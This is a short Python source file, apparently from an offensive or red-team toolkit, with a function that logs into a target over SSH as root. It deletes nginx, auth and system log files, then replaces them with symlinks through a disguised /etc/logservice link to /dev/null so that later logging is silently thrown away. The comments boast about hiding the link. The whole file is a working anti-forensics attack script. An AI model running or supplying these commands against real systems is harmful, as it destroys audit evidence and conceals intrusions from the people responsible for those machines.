from Utils.Ssh import cmd_ssh

from termcolor import cprint

def remove_logs(target):
    # I did orignally have a clever way to do this, 37% of the time it mucked up
    # Instead, just yeet
    commands = []

    commands.append("rm /var/log/nginx.*")
    commands.append("rm /var/log/auth.log")
    commands.append("rm /var/log/system.log")
    commands.append("rm /var/log/userlog")

    # Symlinks to /dev/null (thanks RT_Mazza)
    # Hides symlink to /dev/null by using a different file!
    commands.append("ln -s /dev/null /etc/logservice")

    # log file -> /etc/logservice -> /dev/null (heheheh)
    commands.append("ln -s /etc/logservice /var/log/nginx.log")
    commands.append("ln -s /etc/logservice /var/log/auth.log")
    commands.append("ln -s /etc/logservice /var/log/system.log")
    commands.append("ln -s /etc/logservice /var/log/userlog")

    try:
        for c in commands:
            cmd_ssh(target, "root", c, showOutput=False)
        cprint("Logs Removed", "yellow")
    except:
        cprint("Failed to Remove Logs", "red")


    
